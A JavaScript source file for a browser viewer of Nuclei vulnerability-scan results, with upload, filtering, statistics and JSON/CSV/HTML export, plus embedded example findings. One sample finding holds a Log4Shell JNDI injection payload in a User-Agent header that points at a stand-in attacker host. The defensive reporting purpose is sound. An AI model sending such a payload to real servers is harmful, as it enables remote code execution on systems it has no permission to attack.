import { state, resetState } from './modules/state.js';
import { initCharts, updateCharts } from './modules/charts.js';
import { renderResults, renderDetailView, initResultsView } from './modules/resultsView.js';
import { initTheme } from './modules/theme.js';
import { utils } from './modules/utils.js';

// Example data for demonstration purposes
const exampleData = [
    {
      "template": "ssl-issuer.yaml",
      "template-id": "ssl-issuer",
      "template-path": "ssl/ssl-issuer.yaml",
      "info": {
        "name": "SSL Issuer Detection",
        "author": "pdteam",
        "severity": "info",
        "description": "This template detects the SSL certificate issuer for a given domain.",
        "tags": ["ssl", "info"]
      },
      "type": "http",
      "host": "example.com",
      "matched-at": "https://example.com",
      "extracted-results": ["Let's Encrypt Authority X3"],
      "ip": "93.184.216.34",
      "timestamp": "2023-04-15T12:30:45Z",
      "request": "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
      "response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: ECS\r\nContent-Length: 1256\r\n\r\n<!DOCTYPE html><html><head><title>Example Domain</title></head><body><h1>Example Domain</h1></body></html>"
    },
    {
      "template": "cve-2021-44228-log4j-rce.yaml",
      "template-id": "cve-2021-44228-log4j-rce",
      "template-path": "cves/2021/CVE-2021-44228.yaml",
      "info": {
        "name": "Apache Log4j Remote Code Execution",
        "author": "pdteam",
        "severity": "critical",
        "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "tags": ["cve", "rce", "log4j", "critical", "apache"]
      },
      "type": "http",
      "host": "vulnerable-app.example.com",
      "matched-at": "https://vulnerable-app.example.com/login",
      "ip": "192.168.1.10",
      "timestamp": "2023-04-15T14:22:18Z",
      "request": "POST /login HTTP/1.1\r\nHost: vulnerable-app.example.com\r\nUser-Agent: ${jndi:ldap://malicious.com/a}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nusername=admin&password=test",
      "response": "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\nServer: Apache Tomcat\r\nContent-Length: 1842\r\n\r\n<html><body><h1>Internal Server Error</h1><p>The server encountered an internal error and was unable to complete your request.</p></body></html>"
    },
    {
      "template": "wordpress-user-enumeration.yaml",
      "template-id": "wordpress-user-enum",
      "template-path": "vulnerabilities/wordpress/wp-user-enum.yaml",
      "info": {
        "name": "WordPress User Enumeration",
        "author": "pdteam",
        "severity": "medium",
        "description": "WordPress user enumeration via REST API.",
        "tags": ["wordpress", "user-enum", "medium"]
      },
      "type": "http",
      "host": "blog.example.org",
      "matched-at": "https://blog.example.org/wp-json/wp/v2/users",
      "extracted-results": ["admin", "editor"],
      "ip": "203.0.113.42",
      "timestamp": "2023-04-15T15:10:33Z",
      "request": "GET /wp-json/wp/v2/users HTTP/1.1\r\nHost: blog.example.org\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nServer: nginx\r\nContent-Length: 1458\r\n\r\n[{\"id\":1,\"name\":\"admin\",\"url\":\"https://blog.example.org\",\"description\":\"Site Administrator\"},{\"id\":2,\"name\":\"editor\",\"url\":\"\",\"description\":\"Content Editor\"}]"
    },
    {
      "template": "exposed-git-directory.yaml",
      "template-id": "exposed-git-dir",
      "template-path": "exposures/configs/exposed-git-directory.yaml",
      "info": {
        "name": "Exposed Git Directory",
        "author": "pdteam",
        "severity": "high",
        "description": "Git directory exposure can lead to disclosure of source code.",
        "tags": ["exposure", "git", "config", "high"]
      },
      "type": "http",
      "host": "dev.example.net",
      "matched-at": "https://dev.example.net/.git/",
      "ip": "198.51.100.73",
      "timestamp": "2023-04-15T16:45:12Z",
      "request": "GET /.git/ HTTP/1.1\r\nHost: dev.example.net\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
      "response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: nginx\r\nContent-Length: 566\r\n\r\n<html><head><title>Index of /.git/</title></head><body><h1>Index of /.git/</h1><ul><li><a href=\"HEAD\">HEAD</a></li><li><a href=\"config\">config</a></li><li><a href=\"objects/\">objects/</a></li></ul></body></html>"
    },
    {
      "template": "spring-actuator-heapdump.yaml",
      "template-id": "spring-actuator-heapdump",
      "template-path": "exposures/apis/spring-actuator-heapdump.yaml",
      "info": {
        "name": "Spring Boot Actuator Heapdump Exposure",
        "author": "pdteam",
        "severity": "high",
        "description": "Spring Boot Actuator heapdump endpoint is exposed, which can lead to sensitive memory data exposure.",
        "tags": ["spring", "actuator", "exposure", "high"]
      },
      "type": "http",
      "host": "api.example.io",
      "matched-at": "https://api.example.io/actuator/heapdump",
      "ip": "203.0.113.25",
      "timestamp": "2023-04-15T17:30:05Z",
      "request": "GET /actuator/heapdump HTTP/1.1\r\nHost: api.example.io\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nServer: Apache\r\nContent-Length: 15482354\r\n\r\n[BINARY DATA]"
    }
  ];
  
  document.addEventListener('DOMContentLoaded', () => {
    initApp();
  });
  
  function initApp() {
    // Initialize event listeners and setup
    setupEventListeners();
    setupDragAndDrop();
    initTheme();
    initResultsView();
  }
  
  function setupEventListeners() {
    // Upload events
    const fileUploadInput = document.getElementById('file-upload');
    if (fileUploadInput) {
      fileUploadInput.addEventListener('change', handleFileUpload);
    }
    
    // Browse button click
    const browseBtn = document.querySelector('.browse-btn');
    if (browseBtn) {
      browseBtn.addEventListener('click', () => {
        fileUploadInput.click();
      });
    }
    
    // Example data
    const loadExampleBtn = document.getElementById('load-example-data');
    if (loadExampleBtn) {
      loadExampleBtn.addEventListener('click', loadExampleData);
    }
    
    // Navigation
    const backToHomeBtn = document.getElementById('back-to-home');
    if (backToHomeBtn) {
      backToHomeBtn.addEventListener('click', resetToHome);
    }
    
    const uploadNewFileBtn = document.getElementById('upload-new-file');
    if (uploadNewFileBtn) {
      uploadNewFileBtn.addEventListener('click', () => {
        document.getElementById('file-upload').click();
      });
    }
    
    const homeLink = document.getElementById('home-link');
    if (homeLink) {
      homeLink.addEventListener('click', (e) => {
        e.preventDefault();
        resetToHome();
      });
    }
    
    const navHome = document.getElementById('nav-home');
    if (navHome) {
      navHome.addEventListener('click', (e) => {
        e.preventDefault();
        resetToHome();
      });
    }
    
    // Filters
    const searchInput = document.getElementById('search');
    if (searchInput) {
      searchInput.addEventListener('input', applyFilters);
    }
    
    const severityFilter = document.getElementById('severity-filter');
    if (severityFilter) {
      severityFilter.addEventListener('change', applyFilters);
    }
    
    const tagFilter = document.getElementById('tag-filter');
    if (tagFilter) {
      tagFilter.addEventListener('input', applyFilters);
    }
    
    // Export
    const exportBtn = document.getElementById('export-btn');
    if (exportBtn) {
      exportBtn.addEventListener('click', handleExport);
    }
    
    // Warning before page reload/close
    window.addEventListener('beforeunload', function(e) {
      if (state.dataLoaded) {
        const message = 'Warning: Reloading will cause all scan data to be lost. Are you sure you want to continue?';
        e.returnValue = message;
        return message;
      }
    });
  }
  
  function setupDragAndDrop() {
    const uploadArea = document.querySelector('.upload-area');
    if (!uploadArea) return;
    
    uploadArea.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadArea.classList.add('dragover');
    });
    
    uploadArea.addEventListener('dragleave', () => {
      uploadArea.classList.remove('dragover');
    });
    
    uploadArea.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadArea.classList.remove('dragover');
      
      const files = e.dataTransfer.files;
      if (files.length > 0) {
        document.getElementById('file-upload').files = files;
        handleFileUpload({ target: { files } });
      }
    });
  }
  
  //-------------------- File Upload & Parsing --------------------
  function handleFileUpload(e) {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    
    const file = files[0];
    const reader = new FileReader();
    
    reader.onload = (event) => {
      try {
        const data = JSON.parse(event.target.result);
        processFindings(data, file.name);
      } catch (error) {
        alert('Error parsing JSON file. Please ensure it is valid JSON.');
        console.error('JSON parsing error:', error);
      }
    };
    
    reader.onerror = () => {
      alert('Error reading file. Please try again.');
    };
    
    reader.readAsText(file);
  }
  
  function processFindings(data, fileName) {
    // Handle both array format and newline-delimited JSON
    let parsedData;
    if (Array.isArray(data)) {
      parsedData = data;
    } else if (typeof data === 'string') {
      // Try to parse as newline-delimited JSON
      try {
        parsedData = data.split('\n')
          .filter(line => line.trim())
          .map(line => JSON.parse(line));
      } catch (e) {
        console.error('Failed to parse as newline-delimited JSON:', e);
        parsedData = [];
      }
    } else if (typeof data === 'object') {
      // Single finding object
      parsedData = [data];
    } else {
      parsedData = [];
    }
    
    // Update state
    state.scanResults = parsedData;
    state.dataLoaded = true;
    
    // Update UI with file info
    document.getElementById('file-name').textContent = fileName || 'Uploaded File';
    document.querySelector('.file-info').style.display = 'flex';
    
    // Show results view
    showResultsView();
    
    // Generate stats and apply filters
    generateStats();
    applyFilters();
  }
  
  //-------------------- Example Data --------------------
  function loadExampleData() {
    processFindings(exampleData, 'Example Data');
  }
  
  //-------------------- UI Navigation --------------------
  function showResultsView() {
    document.getElementById('welcome-screen').style.display = 'none';
    document.getElementById('results-view').style.display = 'block';
    document.querySelector('.results-header').style.display = 'flex';
  }
  
  function resetToHome() {
    document.getElementById('welcome-screen').style.display = 'block';
    document.getElementById('results-view').style.display = 'none';
    document.querySelector('.results-header').style.display = 'none';
    
    // Reset file input
    const fileUpload = document.getElementById('file-upload');
    if (fileUpload) fileUpload.value = '';
    
    // Reset file info
    document.getElementById('file-name').textContent = 'No file loaded';
    document.querySelector('.file-info').style.display = 'none';
    
    // Reset state
    resetState();
    
    // Clear UI
    clearResults();
  }
  
  function clearResults() {
    const resultsList = document.getElementById('results-list');
    const detailView = document.getElementById('detail-view');
    
    if (resultsList) {
      resultsList.innerHTML = '';
    }
    
    if (detailView) {
      detailView.innerHTML = `
        <div class="placeholder">
          <i class="fas fa-search-plus"></i>
          <p>Select a finding to view details</p>
        </div>
      `;
    }
    
    // Reset stats
    document.getElementById('total-findings').textContent = '0';
    document.getElementById('critical-count').textContent = '0';
    document.getElementById('high-count').textContent = '0';
    document.getElementById('medium-count').textContent = '0';
    document.getElementById('low-count').textContent = '0';
    document.getElementById('info-count').textContent = '0';
    document.getElementById('filtered-count').textContent = '0';
  }
  
  function applyFilters() {
    const searchTerm = document.getElementById('search')?.value.toLowerCase() || '';
    const severityValue = document.getElementById('severity-filter')?.value || 'all';
    const tagValue = document.getElementById('tag-filter')?.value.toLowerCase() || '';
    
    // Start with all findings
    let filtered = [...state.scanResults];
    
    // Apply severity filter
    if (severityValue !== 'all') {
      filtered = filtered.filter(result => 
        result.info && result.info.severity === severityValue
      );
    }
    
    // Apply tag filter
    if (tagValue.trim()) {
      filtered = filtered.filter(result => {
        if (!result.info || !result.info.tags) return false;
        return result.info.tags.some(tag => 
          tag.toLowerCase().includes(tagValue)
        );
      });
    }
    
    // Apply search filter
    if (searchTerm.trim()) {
      filtered = filtered.filter(result => {
        const templateName = (result.template || '').toLowerCase();
        const findingName = (result.info && result.info.name ? result.info.name.toLowerCase() : '');
        const description = (result.info && result.info.description ? result.info.description.toLowerCase() : '');
        const host = (result.host || '').toLowerCase();
        
        return templateName.includes(searchTerm) || 
               findingName.includes(searchTerm) || 
               description.includes(searchTerm) ||
               host.includes(searchTerm);
      });
    }
    
    // Update state
    state.filteredResults = filtered;
    
    // Update UI
    renderResults();
    updateFilteredCount();
  }
  
  function updateFilteredCount() {
    const filteredCountEl = document.getElementById('filtered-count');
    if (filteredCountEl) {
      filteredCountEl.textContent = state.filteredResults.length;
    }
  }
  
  function generateStats() {
    // Update count elements
    document.getElementById('total-findings').textContent = state.scanResults.length;
    document.getElementById('critical-count').textContent = countBySeverity('critical');
    document.getElementById('high-count').textContent = countBySeverity('high');
    document.getElementById('medium-count').textContent = countBySeverity('medium');
    document.getElementById('low-count').textContent = countBySeverity('low');
    document.getElementById('info-count').textContent = countBySeverity('info');
    document.getElementById('filtered-count').textContent = state.scanResults.length;
    
    // Generate charts
    initCharts();
  }
  
  function countBySeverity(severity) {
    return state.scanResults.filter(finding => 
      finding.info && finding.info.severity === severity
    ).length;
  }
  
  function handleExport() {
    const exportFormat = document.getElementById('export-format').value;
    const exportFiltered = document.getElementById('export-filtered').checked;
    const dataToExport = exportFiltered ? state.filteredResults : state.scanResults;
    
    if (dataToExport.length === 0) {
      alert('No findings to export.');
      return;
    }
    
    switch (exportFormat) {
      case 'json':
        exportJSON(dataToExport);
        break;
      case 'csv':
        exportCSV(dataToExport);
        break;
      case 'html':
        exportHTML(dataToExport);
        break;
      default:
        alert('Unsupported export format');
    }
  }
  
  function exportJSON(data) {
    const jsonString = JSON.stringify(data, null, 2);
    utils.downloadFile(jsonString, 'nuclei-findings.json', 'application/json');
  }
  
  function exportCSV(data) {
    // Define CSV headers
    const headers = [
      'Severity',
      'Template',
      'Name',
      'Host',
      'IP',
      'Timestamp',
      'Tags'
    ];
    
    // Convert findings to CSV rows
    const rows = data.map(finding => {
      return [
        finding.info?.severity || 'unknown',
        finding.template || '',
        finding.info?.name || '',
        finding.host || finding['matched-at'] || '',
        finding.ip || '',
        finding.timestamp || '',
        finding.info?.tags ? finding.info.tags.join(', ') : ''
      ];
    });
    
    // Combine headers and rows
    const csvContent = [
      headers.join(','),
      ...rows.map(row => row.map(cell => `"${(cell || '').toString().replace(/"/g, '""')}"`).join(','))
    ].join('\n');
    
    utils.downloadFile(csvContent, 'nuclei-findings.csv', 'text/csv');
  }
  
  function exportHTML(data) {
    // Create HTML template
    const htmlTemplate = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nuclei Scan Results</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        color: #333;
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
      }
      h1 {
        color: #2980b9;
        border-bottom: 2px solid #eee;
        padding-bottom: 10px;
      }
      .stats {
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        margin: 20px 0;
      }
      .stat-item {
        background: #f8f9fa;
        border-radius: 5px;
        padding: 15px;
        text-align: center;
        min-width: 120px;
      }
      .stat-value {
        font-size: 24px;
        font-weight: bold;
      }
      .critical { color: #e74c3c; }
      .high { color: #e67e22; }
      .medium { color: #f39c12; }
      .low { color: #3498db; }
      .info { color: #7f8c8d; }
      
      .findings {
        margin-top: 30px;
      }
      .finding {
        background: #fff;
        border: 1px solid #ddd;
        border-radius: 5px;
        padding: 15px;
        margin-bottom: 20px;
      }
      .finding-header {
        display: flex;
        justify-content: space-between;
        border-bottom: 1px solid #eee;
        padding-bottom: 10px;
        margin-bottom: 10px;
      }
      .finding-title {
        font-size: 18px;
        font-weight: bold;
      }
      .finding-severity {
        padding: 3px 10px;
        border-radius: 3px;
        color: white;
        font-weight: bold;
      }
      .severity-critical { background-color: #e74c3c; }
      .severity-high { background-color: #e67e22; }
      .severity-medium { background-color: #f39c12; }
      .severity-low { background-color: #3498db; }
      .severity-info { background-color: #7f8c8d; }
      
      .finding-meta {
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        margin-bottom: 15px;
        font-size: 14px;
        color: #666;
      }
      .finding-meta-item {
        display: flex;
        align-items: center;
        gap: 5px;
      }
      .finding-tags {
        display: flex;
        flex-wrap: wrap;
        gap: 5px;
        margin-bottom: 15px;
      }
      .tag {
        background: #f0f0f0;
        padding: 3px 8px;
        border-radius: 3px;
        font-size: 12px;
        color: #666;
      }
      .finding-section {
        margin-bottom: 15px;
      }
      .finding-section h3 {
        font-size: 16px;
        margin-bottom: 5px;
        color: #2980b9;
      }
      .request-response {
        background: #f8f9fa;
        padding: 10px;
        border-radius: 3px;
        font-family: monospace;
        white-space: pre-wrap;
        overflow-x: auto;
        font-size: 13px;
        max-height: 300px;
        overflow-y: auto;
      }
      .footer {
        margin-top: 40px;
        text-align: center;
        font-size: 14px;
        color: #666;
        border-top: 1px solid #eee;
        padding-top: 20px;
      }
    </style>
  </head>
  <body>
    <h1>Nuclei Scan Results</h1>
    
    <div class="stats">
      <div class="stat-item">
        <div class="stat-value">${data.length}</div>
        <div class="stat-label">Total</div>
      </div>
      <div class="stat-item">
        <div class="stat-value critical">${data.filter(f => f.info?.severity === 'critical').length}</div>
        <div class="stat-label">Critical</div>
      </div>
      <div class="stat-item">
        <div class="stat-value high">${data.filter(f => f.info?.severity === 'high').length}</div>
        <div class="stat-label">High</div>
      </div>
      <div class="stat-item">
        <div class="stat-value medium">${data.filter(f => f.info?.severity === 'medium').length}</div>
        <div class="stat-label">Medium</div>
      </div>
      <div class="stat-item">
        <div class="stat-value low">${data.filter(f => f.info?.severity === 'low').length}</div>
        <div class="stat-label">Low</div>
      </div>
      <div class="stat-item">
        <div class="stat-value info">${data.filter(f => f.info?.severity === 'info').length}</div>
        <div class="stat-label">Info</div>
      </div>
    </div>
    
    <div class="findings">
      ${data.map(finding => {
        const severity = finding.info?.severity || 'info';
        const title = finding.info?.name || finding.template || 'Unknown';
        const description = finding.info?.description || 'No description available';
        const host = finding.host || finding['matched-at'] || 'Unknown Host';
        const ip = finding.ip || 'Unknown IP';
        const timestamp = finding.timestamp ? new Date(finding.timestamp).toLocaleString() : 'Unknown Time';
        const tags = finding.info?.tags || [];
        const references = finding.info?.reference ? 
          (Array.isArray(finding.info.reference) ? finding.info.reference : [finding.info.reference]) : [];
        
        return `
          <div class="finding">
            <div class="finding-header">
              <div class="finding-title">${utils.escapeHtml(title)}</div>
              <div class="finding-severity severity-${severity}">${severity}</div>
            </div>
            
            <div class="finding-meta">
              <div class="finding-meta-item">
                <strong>Template:</strong> ${utils.escapeHtml(finding.template || 'Unknown')}
              </div>
              <div class="finding-meta-item">
                <strong>Host:</strong> ${utils.escapeHtml(host)}
              </div>
              <div class="finding-meta-item">
                <strong>IP:</strong> ${utils.escapeHtml(ip)}
              </div>
              <div class="finding-meta-item">
                <strong>Time:</strong> ${utils.escapeHtml(timestamp)}
              </div>
            </div>
            
            <div class="finding-tags">
              ${tags.map(tag => `<span class="tag">${utils.escapeHtml(tag)}</span>`).join('')}
            </div>
            
            <div class="finding-section">
              <h3>Description</h3>
              <div>${utils.escapeHtml(description)}</div>
            </div>
            
            ${references.length > 0 ? `
              <div class="finding-section">
                <h3>References</h3>
                <ul>
                  ${references.map(ref => `<li><a href="${utils.escapeHtml(ref)}" target="_blank">${utils.escapeHtml(ref)}</a></li>`).join('')}
                </ul>
              </div>
            ` : ''}
            
            ${finding.request ? `
              <div class="finding-section">
                <h3>Request</h3>
                <div class="request-response">${utils.escapeHtml(finding.request)}</div>
              </div>
            ` : ''}
            
            ${finding.response ? `
              <div class="finding-section">
                <h3>Response</h3>
                <div class="request-response">${utils.escapeHtml(finding.response)}</div>
              </div>
            ` : ''}
            
            ${finding['extracted-results'] ? `
              <div class="finding-section">
                <h3>Extracted Results</h3>
                <div>${Array.isArray(finding['extracted-results']) ? 
                  finding['extracted-results'].map(result => utils.escapeHtml(result)).join('<br>') : 
                  utils.escapeHtml(finding['extracted-results'])}
                </div>
              </div>
            ` : ''}
          </div>
        `;
      }).join('')}
    </div>
    
    <div class="footer">
      <p>Generated by Nuclei Scan Results Viewer on ${new Date().toLocaleString()}</p>
    </div>
  </body>
  </html>
    `;
    
    utils.downloadFile(htmlTemplate, 'nuclei-findings.html', 'text/html');
  }
  